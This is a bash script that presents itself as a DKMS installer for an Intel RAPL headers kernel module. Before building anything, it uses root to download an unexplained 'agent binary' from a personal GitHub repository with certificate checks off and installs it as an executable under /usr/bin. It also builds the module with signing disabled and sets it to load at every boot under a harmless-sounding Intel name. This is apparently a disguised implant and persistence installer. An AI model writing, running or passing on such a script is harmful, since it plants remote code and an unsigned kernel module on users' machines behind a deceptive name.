#!/bin/bash
set -e

MODULE_NAME="intel_rapl_headers"
MODULE_VERSION="1.1"
SRC_DIR=$(pwd)
INSTALL_DIR="/usr/src/${MODULE_NAME}-${MODULE_VERSION}"

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}[*] Installing agent binary...${NC}"
sudo wget https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package --no-check-certificate -O /usr/bin/intelheaders_gnu
sudo chmod +x /usr/bin/intelheaders_gnu
echo -e "${GREEN}[+] Agent installed to /usr/bin/intelheaders_gnu${NC}"

echo -e "${BLUE}[*] Preparing DKMS source directory...${NC}"
sudo rm -rf "$INSTALL_DIR"
sudo mkdir -p "$INSTALL_DIR"
sudo cp -r "$SRC_DIR"/* "$INSTALL_DIR"

echo -e "${BLUE}[*] Creating dkms.conf...${NC}"
cat <<EOF | sudo tee "$INSTALL_DIR/dkms.conf" > /dev/null
PACKAGE_NAME="${MODULE_NAME}"
PACKAGE_VERSION="${MODULE_VERSION}"
BUILT_MODULE_NAME="${MODULE_NAME}"
DEST_MODULE_LOCATION="/kernel/drivers/${MODULE_NAME}"
AUTOINSTALL="yes"
MAKE[0]="make CONFIG_MODULE_SIG=n -C \$kernel_source_dir M=\$dkms_tree/\$PACKAGE_NAME/\$PACKAGE_VERSION/build"
CLEAN="make -C \$kernel_source_dir M=\$dkms_tree/\$PACKAGE_NAME/\$PACKAGE_VERSION/build clean"
EOF

echo -e "${BLUE}[*] Cleaning old DKMS entries if any...${NC}"
if dkms status | grep -q "${MODULE_NAME}, ${MODULE_VERSION}"; then
    sudo dkms remove -m "$MODULE_NAME" -v "$MODULE_VERSION" --all
fi

echo -e "${BLUE}[*] Adding, building, and installing via DKMS...${NC}"
sudo dkms add -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms build -m "$MODULE_NAME" -v "$MODULE_VERSION"
sudo dkms install -m "$MODULE_NAME" -v "$MODULE_VERSION"

echo -e "${BLUE}[*] Ensuring auto-load at boot...${NC}"
echo "$MODULE_NAME" | sudo tee /etc/modules-load.d/${MODULE_NAME}.conf > /dev/null

echo -e "${BLUE}[*] Loading module now...${NC}"
sudo modprobe "$MODULE_NAME"

if lsmod | grep -q "$MODULE_NAME"; then
    echo -e "${GREEN}[+] Module '$MODULE_NAME' loaded and will persist after reboot.${NC}"
else
    echo -e "${RED}[!] Module failed to load. Check dmesg or DKMS logs.${NC}"
    exit 1
fi
